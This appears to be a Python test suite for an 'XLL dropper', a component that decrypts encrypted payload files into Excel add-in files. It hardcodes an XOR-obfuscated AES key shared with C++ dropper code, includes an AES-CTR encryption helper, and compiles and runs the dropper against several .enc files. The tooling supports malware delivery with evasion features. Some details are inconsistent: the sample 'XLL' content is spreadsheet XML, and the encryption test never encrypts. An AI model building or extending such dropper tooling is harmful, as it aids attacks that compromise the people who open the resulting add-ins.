#!/usr/bin/env python3
"""
Comprehensive test script for XLL Dropper functionality
Tests encryption, decryption, and file handling
"""

import os
import sys
import subprocess
import secrets
import tempfile
import shutil

# --- Key handling (shared with C++ code) ---
XOR_OBFUSCATE_KEY = 0x5A
ENC_KEY = bytes([0x39, 0x39, 0x08, 0x0F, 0x0F, 0x38, 0x08, 0x31, 0x38, 0x32, 0x38])

def get_deobfuscated_key():
    env_key = os.getenv("ENCRYPTION_KEY")
    if env_key and len(env_key) >= len(ENC_KEY):
        return env_key[:len(ENC_KEY)].encode('utf-8')
    else:
        # Fallback to obfuscated key
        return bytes([b ^ XOR_OBFUSCATE_KEY for b in ENC_KEY])

KEY_DEOBFUSCATED = get_deobfuscated_key()

def create_test_xll_content():
    """Create a sample XLL file content"""
    return b"""<?xml version="1.0" encoding="UTF-8"?>
<workbook xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main">
    <sheets>
        <sheet name="Test" sheetId="1" r:id="rId1"/>
    </sheets>
</workbook>"""

def aes_ctr_encrypt_with_nonce(data: bytes, key: bytes, nonce: bytes = None) -> tuple[bytes, bytes]:
    """Encrypt data using AES-128-CTR with nonce"""
    try:
        from Crypto.Cipher import AES
    except ImportError:
        try:
            from Cryptodome.Cipher import AES
        except ImportError:
            raise RuntimeError("PyCryptodome is required for AES operations")
    
    # Expand/truncate key to 16 bytes for AES-128
    key16 = (key * (16 // len(key) + 1))[:16]
    
    # Generate nonce if not provided (use 12 bytes for compatibility)
    if nonce is None:
        nonce = secrets.token_bytes(12)
    
    # Create a 16-byte nonce by padding with zeros (compatible with C++ code)
    nonce_16 = nonce + b'\x00' * 4
    
    cipher = AES.new(key16, AES.MODE_CTR, nonce=nonce_16)
    encrypted_data = cipher.encrypt(data)
    return encrypted_data, nonce_16

def test_xll_dropper_compilation():
    """Test if XLL dropper compiles correctly"""
    print("Testing XLL dropper compilation...")
    
    try:
        result = subprocess.run([
            'g++', '-o', 'xll_dropper_test', 'xll_dropper.cpp', 
            '-lssl', '-lcrypto', '-std=c++11'
        ], capture_output=True, text=True)
        
        if result.returncode == 0:
            print("✓ XLL dropper compilation PASSED")
            return True
        else:
            print(f"✗ XLL dropper compilation FAILED")
            print(f"Error: {result.stderr}")
            return False
    except Exception as e:
        print(f"✗ XLL dropper compilation FAILED: {e}")
        return False

def test_xll_encryption_decryption():
    """Test XLL file encryption and decryption using existing files"""
    print("\nTesting XLL dropper with existing encrypted files...")
    
    # Test with existing encrypted files
    test_files = [
        ('test.enc', 'test_output.xll'),
        ('fake.enc', 'fake_output.xll'),
        ('final_test.enc', 'final_output.xll')
    ]
    
    success_count = 0
    
    for encrypted_file, output_file in test_files:
        if os.path.exists(encrypted_file):
            print(f"Testing with {encrypted_file}...")
            try:
                result = subprocess.run([
                    './xll_dropper_test', encrypted_file, output_file
                ], capture_output=True, text=True)
                
                if result.returncode == 0:
                    print(f"✓ Successfully decrypted {encrypted_file}")
                    
                    # Check if output file was created and has content
                    if os.path.exists(output_file) and os.path.getsize(output_file) > 0:
                        print(f"✓ Output file {output_file} created successfully ({os.path.getsize(output_file)} bytes)")
                        success_count += 1
                        
                        # Clean up
                        os.remove(output_file)
                    else:
                        print(f"✗ Output file {output_file} is empty or missing")
                else:
                    print(f"✗ Failed to decrypt {encrypted_file}: {result.stderr}")
                    
            except Exception as e:
                print(f"✗ Error testing {encrypted_file}: {e}")
        else:
            print(f"Skipping {encrypted_file} - file not found")
    
    if success_count > 0:
        print(f"✓ XLL dropper encryption/decryption test PASSED ({success_count} files processed)")
        return True
    else:
        print("✗ XLL dropper encryption/decryption test FAILED")
        return False

def test_existing_encrypted_files():
    """Test XLL dropper with existing encrypted files"""
    print("\nTesting with existing encrypted files...")
    
    # Check for existing encrypted files
    existing_files = [
        'fake.enc',
        'final_test.enc',
        'test.enc',
        'test2.enc',
        'test3.enc'
    ]
    
    test_results = []
    
    for filename in existing_files:
        if os.path.exists(filename):
            print(f"Testing with {filename}...")
            try:
                output_file = f"decrypted_{filename.replace('.enc', '.xll')}"
                result = subprocess.run([
                    './xll_dropper_test', filename, output_file
                ], capture_output=True, text=True)
                
                if result.returncode == 0:
                    print(f"✓ Successfully decrypted {filename}")
                    test_results.append(True)
                    
                    # Check if output file was created and has content
                    if os.path.exists(output_file) and os.path.getsize(output_file) > 0:
                        print(f"✓ Output file {output_file} created successfully")
                    else:
                        print(f"✗ Output file {output_file} is empty or missing")
                        test_results.append(False)
                else:
                    print(f"✗ Failed to decrypt {filename}: {result.stderr}")
                    test_results.append(False)
                    
            except Exception as e:
                print(f"✗ Error testing {filename}: {e}")
                test_results.append(False)
        else:
            print(f"Skipping {filename} - file not found")
    
    return all(test_results) if test_results else True

def test_error_handling():
    """Test XLL dropper error handling"""
    print("\nTesting error handling...")
    
    # Test with non-existent file
    try:
        result = subprocess.run([
            './xll_dropper_test', 'non_existent_file.enc'
        ], capture_output=True, text=True)
        
        if result.returncode != 0:
            print("✓ Non-existent file handling PASSED")
        else:
            print("✗ Non-existent file handling FAILED - should have returned error")
            return False
    except Exception as e:
        print(f"✗ Error handling test FAILED: {e}")
        return False
    
    # Test with invalid arguments
    try:
        result = subprocess.run([
            './xll_dropper_test'
        ], capture_output=True, text=True)
        
        if result.returncode != 0:
            print("✓ Invalid arguments handling PASSED")
        else:
            print("✗ Invalid arguments handling FAILED - should have returned error")
            return False
    except Exception as e:
        print(f"✗ Error handling test FAILED: {e}")
        return False
    
    return True

def test_large_file_handling():
    """Test XLL dropper with large files"""
    print("\nTesting large file handling...")
    
    # Test with existing large encrypted files
    large_files = [
        ('large_test.enc', 'large_test_output.xll'),
        ('big.enc', 'big_output.xll')
    ]
    
    success_count = 0
    
    for encrypted_file, output_file in large_files:
        if os.path.exists(encrypted_file):
            file_size = os.path.getsize(encrypted_file)
            print(f"Testing with {encrypted_file} ({file_size} bytes)...")
            try:
                result = subprocess.run([
                    './xll_dropper_test', encrypted_file, output_file
                ], capture_output=True, text=True)
                
                if result.returncode == 0:
                    print(f"✓ Successfully decrypted {encrypted_file}")
                    
                    # Check if output file was created and has content
                    if os.path.exists(output_file) and os.path.getsize(output_file) > 0:
                        output_size = os.path.getsize(output_file)
                        print(f"✓ Output file {output_file} created successfully ({output_size} bytes)")
                        success_count += 1
                        
                        # Clean up
                        os.remove(output_file)
                    else:
                        print(f"✗ Output file {output_file} is empty or missing")
                else:
                    print(f"✗ Failed to decrypt {encrypted_file}: {result.stderr}")
                    
            except Exception as e:
                print(f"✗ Error testing {encrypted_file}: {e}")
        else:
            print(f"Skipping {encrypted_file} - file not found")
    
    if success_count > 0:
        print(f"✓ Large file handling test PASSED ({success_count} files processed)")
        return True
    else:
        print("✗ Large file handling test FAILED")
        return False

def main():
    """Run all XLL dropper tests"""
    print("=== XLL Dropper Test Suite ===")
    print(f"Using key: {KEY_DEOBFUSCATED.hex()}")
    print()
    
    tests_passed = 0
    total_tests = 5
    
    # Test compilation
    if test_xll_dropper_compilation():
        tests_passed += 1
    
    # Test encryption/decryption
    if test_xll_encryption_decryption():
        tests_passed += 1
    
    # Test with existing files
    if test_existing_encrypted_files():
        tests_passed += 1
    
    # Test error handling
    if test_error_handling():
        tests_passed += 1
    
    # Test large file handling
    if test_large_file_handling():
        tests_passed += 1
    
    print(f"\n=== XLL Dropper Test Results ===")
    print(f"Tests passed: {tests_passed}/{total_tests}")
    
    if tests_passed == total_tests:
        print("✓ All XLL dropper tests PASSED - XLL dropper is working correctly!")
        return 0
    else:
        print("✗ Some XLL dropper tests FAILED - Please check the issues above")
        return 1

if __name__ == "__main__":
    sys.exit(main())